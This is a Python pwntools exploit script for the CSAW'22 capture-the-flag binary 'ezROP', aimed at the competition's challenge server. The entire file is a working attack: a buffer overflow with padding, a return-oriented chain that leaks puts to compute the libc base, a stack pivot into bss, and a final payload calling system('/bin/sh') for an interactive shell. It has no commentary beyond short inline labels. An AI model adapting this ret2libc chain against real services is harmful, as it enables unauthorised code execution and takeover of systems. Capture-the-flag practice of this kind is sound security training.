#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./ezROP')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('pwn.chal.csaw.io', 5002)
    libc = ELF('./libc.so.6')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
readn = 0x0000000000401304
bss_buf = 0x404f00

#gdb.attach(p, 'b *0x40152d\nb *0x4011ed\nc')

pop_rdi_ret = 0x00000000004015a3
pop_rsi_r15_ret = 0x00000000004015a1
leave_ret = 0x0000000000401302
pop_rbp_ret = 0x00000000004011ed

payload = (
        'A' * 112 + # padding
        up64(0) + # bypass check()
        up64(pop_rdi_ret) + up64(puts_got) + up64(puts_plt) + # leak libc
        up64(pop_rdi_ret) + up64(bss_buf) + up64(pop_rsi_r15_ret) + up64(0x100) + up64(0) + up64(readn) + # read new payload
        up64(pop_rbp_ret) + up64(bss_buf - 8) + up64(leave_ret) # stack pivot
        )
sla('My friend, what\'s your name?\n', payload)

ru('Welcome to CSAW\'22!\n')
puts_addr = uu64(r(6).ljust(8, '\x00'))
info('puts_addr = ' + hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
info('libc_base = ' + hex(libc_base))
system_addr = libc_base + libc.sym['system']
info('system_addr = ' + hex(system_addr))
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
info('binsh_addr = ' + hex(binsh_addr))

input('@')
payload = up64(pop_rdi_ret) + up64(binsh_addr) + up64(system_addr) # get shell
sl(payload)

p.interactive()

